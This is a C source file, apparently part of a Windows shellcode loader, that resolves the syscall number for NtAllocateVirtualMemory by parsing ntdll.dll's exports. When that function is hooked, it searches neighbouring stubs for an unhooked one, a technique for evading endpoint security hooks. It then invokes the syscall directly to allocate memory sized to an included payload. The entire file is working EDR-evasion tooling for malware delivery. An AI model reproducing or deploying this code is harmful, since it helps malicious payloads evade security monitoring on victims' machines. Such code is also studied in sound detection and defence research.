#include <windows.h>
#include <stdio.h>
#include "Payload.h"

DWORD NtAllocateVirtualMemory_SSN;

extern NTSTATUS NTAPI Sys_NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG PageProtection
);

#define NT_SUCCESS(Status)  (((NTSTATUS)(Status)) >= 0)


DWORD GetHookedSSN( PBYTE pFuncAddr ) {

    DWORD stubCount = 1;
    DWORD SSN = 0;
    PBYTE pOrgFuncAddr = pFuncAddr;

    pFuncAddr -= 0x20;

    do {
        if ( pFuncAddr[ 0 ] == 0x4C
            && pFuncAddr[ 1 ] == 0x8B
            && pFuncAddr[ 2 ] == 0xD1
            && pFuncAddr[ 3 ] == 0xB8
            && pFuncAddr[ 6 ] == 0x00
            && pFuncAddr[ 7 ] == 0x00 ) {
            SSN = *( DWORD* )( pFuncAddr + 4 ) + stubCount;
            printf( "[+] SSN: 0x%X\n", SSN );
            printf( "[+] Found unhooked stub at 0x%p\n", pFuncAddr );
            return SSN;
        }
        else {
            stubCount++;
            pFuncAddr -= 0x20;
        }
    } while ( stubCount < 10 );


    stubCount = 1;
    pOrgFuncAddr += 0x20;

    do {
        if ( pOrgFuncAddr[ 0 ] == 0x4C
            && pOrgFuncAddr[ 1 ] == 0x8B
            && pOrgFuncAddr[ 2 ] == 0xD1
            && pOrgFuncAddr[ 3 ] == 0xB8
            && pOrgFuncAddr[ 6 ] == 0x00
            && pOrgFuncAddr[ 7 ] == 0x00 ) {
            SSN = *( DWORD* )( pOrgFuncAddr + 4 ) - stubCount;
            printf( "[+] Found unhooked stub at 0x%p\n", pOrgFuncAddr );
            return SSN;
        }
        else {
            stubCount++;
            pOrgFuncAddr += 0x20;
        }
    } while ( stubCount < 10 );

    return 0;
}

DWORD GetSSN( HMODULE hModule, LPCSTR lpFunctionName ) {


    PIMAGE_DOS_HEADER pDosHeader = ( PIMAGE_DOS_HEADER )hModule;

    if ( pDosHeader->e_magic != IMAGE_DOS_SIGNATURE ) {
        fprintf( stderr, "[-] Invalid DOS header\n" );
        return 0;
    }

    PIMAGE_NT_HEADERS pNtHeaders = ( PIMAGE_NT_HEADERS )( ( PBYTE )hModule + pDosHeader->e_lfanew );

    if ( pNtHeaders->Signature != IMAGE_NT_SIGNATURE ) {
        fprintf( stderr, "[-] Invalid NT header\n" );
        return 0;
    }


    PIMAGE_EXPORT_DIRECTORY pExportDirectory = ( PIMAGE_EXPORT_DIRECTORY )( ( PBYTE )hModule + pNtHeaders->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );

    if ( pExportDirectory->NumberOfNames == 0 ) {
        fprintf( stderr, "[-] No exported functions\n" );
        return 0;
    }

    PDWORD pAddressOfNames = ( PDWORD )( ( PBYTE )hModule + pExportDirectory->AddressOfNames );
    PDWORD pAddressOfFunctions = ( PDWORD )( ( PBYTE )hModule + pExportDirectory->AddressOfFunctions );
    PWORD pAddressOfNameOrdinals = ( PWORD )( ( PBYTE )hModule + pExportDirectory->AddressOfNameOrdinals );

    for ( DWORD i = 0; i < pExportDirectory->NumberOfNames; i++ ) {
        LPCSTR pFunctionName = ( LPCSTR )( ( PBYTE )hModule + pAddressOfNames[ i ] );

        PBYTE pFunctionAddress = ( PBYTE )( ( PBYTE )hModule + pAddressOfFunctions[ pAddressOfNameOrdinals[ i ] ] );


        if ( _stricmp( pFunctionName, lpFunctionName ) != 0 ) {
            continue;
        }

        printf( "[+] %s: 0x%p\n", pFunctionName, pFunctionAddress );

        DWORD SSN = 0;
        for ( DWORD j = 0; j < pExportDirectory->NumberOfFunctions; j++ ) {

            if ( pFunctionAddress[ j ] == 0x4C
                && pFunctionAddress[ j + 1 ] == 0x8B
                && pFunctionAddress[ j + 2 ] == 0xD1
                && pFunctionAddress[ j + 3 ] == 0xB8
                && pFunctionAddress[ j + 6 ] == 0x00
                && pFunctionAddress[ j + 7 ] == 0x00 ) {

                SSN = *( DWORD* )( pFunctionAddress + 4 );
                return SSN;
            }
            else {
                printf( "[!] Hooked Found\n" );
                SSN = GetHookedSSN( pFunctionAddress );
                return SSN;
            }
        }

    }
    return 0;
}


int main( void ) {

    HMODULE hModule = LoadLibraryA( "ntdll.dll" );
    if ( hModule == NULL ) {
        fprintf( stderr, "[-] Failed to load ntdll.dll\n" );
        return 1;
    }

    DWORD SSN = GetSSN( hModule, "NtAllocateVirtualMemory" );
    if ( SSN == 0 ) {
        fprintf( stderr, "[-] Failed to get SSN.\n" );
        return 1;
    }

    printf( "[+] SSN: 0x%X\n", SSN );

    NtAllocateVirtualMemory_SSN = SSN;

    NTSTATUS status;
    PVOID baseAddress = NULL;
    SIZE_T regionSize = ( SIZE_T )payloadSize;
    status = Sys_NtAllocateVirtualMemory(
        GetCurrentProcess(),
        &baseAddress, 0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!NT_SUCCESS( status )) {
        fprintf( stderr, "[-] Failed to allocate memory: 0x%X\n", status );
        return 1;
    }

    printf("[+] Allocated %d bytes at address: 0x%p\n", payloadSize, baseAddress);

    return 0;
}   